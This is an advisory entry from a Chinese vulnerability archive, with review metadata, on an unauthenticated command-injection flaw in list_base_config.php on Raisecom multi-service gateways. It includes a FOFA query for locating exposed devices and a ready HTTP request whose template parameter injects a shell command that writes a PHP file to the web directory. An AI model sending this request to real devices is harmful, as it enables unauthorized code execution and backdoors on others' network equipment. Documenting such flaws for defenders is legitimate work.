---
source: "wy876 漏洞文库"
id: "vw-a5cb8ec0479ea2238d854262"
entity_id: "ve-a5cb8ec0479ea2238d854262"
schema_version: "1"
title: "瑞斯康达多业务智能网关list_base_config存在远程命令执行漏洞"
product: "Raisecom多业务智能网关，简介举MSG2100E/2300"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "声称未认证，型号举例不等于确认影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE/%E7%91%9E%E6%96%AF%E5%BA%B7%E8%BE%BE%E5%A4%9A%E4%B8%9A%E5%8A%A1%E6%99%BA%E8%83%BD%E7%BD%91%E5%85%B3list_base_config%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yrdl3xmt2n3qpy2e"
source_status: "recorded"
previous_fofa_unverified: "body="
fofa: "body=\"/images/raisecom/back.gif\" && title==\"Web user login\""
---

# 瑞斯康达多业务智能网关list_base_config存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Raisecom多业务智能网关，简介举MSG2100E/2300
- 本文讨论：list_base_config.php template命令注入
- 版本、权限与配置前提：声称未认证，型号举例不等于确认影响
- 资料类型：命令注入PoC摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无响应/修复；fofa残缺；与351同写入测试PHP及读回
- 产品介绍举例不能自动转受影响清单
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 型号范围/版本和真实回显待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
瑞斯康达多业务智能网关是一款集多种功能于一体的网络设备，专为中小企业及行业分支机构设计，以满足其多业务接入和带宽提速的需求，如MSG2100E系列、MSG2300系列等，是瑞斯康达科技发展股份有限公司推出的新一代网络产品。这些网关集成了数据、语音、安全、无线等多种功能，能够为用户提供综合、完整的网络接入解决方案。它们广泛应用于政企单位、商务楼宇、校园、工业园区等场景，为用户带来高效、便捷的网络体验。瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

# 二、影响版本
+ 瑞斯康达多业务智能网关

# 三、资产测绘
+ fofa`body="/images/raisecom/back.gif" && title=="Web user login"`
+ 特征


# 四、漏洞复现
```http
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```


```plain
/tmp/test.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yrdl3xmt2n3qpy2e>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
